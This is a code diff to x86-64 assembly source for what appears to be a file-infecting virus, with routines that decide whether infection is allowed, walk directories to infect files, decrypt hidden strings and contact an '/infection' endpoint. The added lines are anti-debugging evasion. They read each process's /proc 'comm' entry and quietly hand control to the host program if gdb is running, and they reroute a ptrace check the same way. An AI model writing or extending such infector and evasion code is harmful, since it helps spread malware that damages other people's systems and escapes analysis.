@@ -14,6 +14,13 @@ _start:
 	PUSHA
 	call _map_int_table
 	; call _check_debug
+
+	lea rdi, [rel procPath]
+	mov rsi, procPathLen
+	call _decrypt_str
+	mov rdi, rax
+	call _initDir
+
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
@@ -62,7 +69,8 @@ _check_debug:
 	mov r10, 0x0
 	syscall
 	cmp rax, 0
-	jl _exit
+	; jl _exit
+	jl _final_jmp
 	pop rax
 	mov rsi, rax
 	mov rax, SYS_PTRACE
@@ -144,14 +152,22 @@ _readDir:
             mov rsi,  rsp
             call _strlen
             lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
+			push rsi
             mov byte [rsi - 1], '/'
             add rax, 1
             sub rsi, rax
             mov rdi, rsp
+			add rdi, 8
             call _strcpyNoNull
 
+			; cmp dword [rdi], 0x6972702F ; pric
+			cmp dword [rdi], 0x6F72702F
+			je _check_proc
+
+			add rsp, 8
 			call _check_file
 
+			_next:
             jmp _checkRead
 
             _recursif:
@@ -191,6 +207,50 @@ _returnLeave:
 
 _return:
     ret
+
+_check_proc:
+	; rsi -> full path
+	; rdx -> nom du fichier 
+	; rdi -> dossier
+	pop rdx	
+	cmp dword [rdx], 0x6D6D6F63
+	jne _next
+	mov	rax, SYS_OPEN
+	mov rdi, rsi
+	mov rsi, O_RDONLY
+	xor rdx, rdx
+	syscall
+	test rax, rax
+	js _next
+
+	sub rsp, 8
+	mov rdi, rax
+	mov rax, SYS_READ
+	mov rsi, rsp
+	mov rdx, 4
+	syscall
+	test rax, rax
+	jz _next
+
+	; push rdi
+	; mov rax, SYS_WRITE
+	; mov rdi, 0x1
+	; mov rsi, rsp
+	; mov rdx, 0x4
+	; syscall
+	; pop rdi
+	; _br_write:
+
+	mov rax, SYS_CLOSE
+	syscall 
+
+	; mov rbx, qword [rsp]
+	mov rbx, rsp
+	mov rbx, qword [rbx]
+	_cmpgdb:
+	cmp ebx, 0x0A626467
+	je _final_jmp
+	jmp _next
 
 _check_file:
 	push rbp
@@ -923,6 +983,9 @@ headerEnd db 0x0D, 0x0A, 0x0D, 0x0A, 0x0
 headerEndLen equ $ - headerEnd
 headerGet db "GET /infection HTTP/1.1", 0x0D, 0x0A, "Host: 127.0.0.1:8000", 0x0D, 0x0A, 0x0D, 0x0A, 0x0
 headerGetLen equ $ - headerGet
+procPath db "/proc", 0x0
+procPathLen equ $ - procPath
+comm db "comm", 0x0
 timespec:
     dq 0          ; Secondes
     dq 10000000     ; 100ms
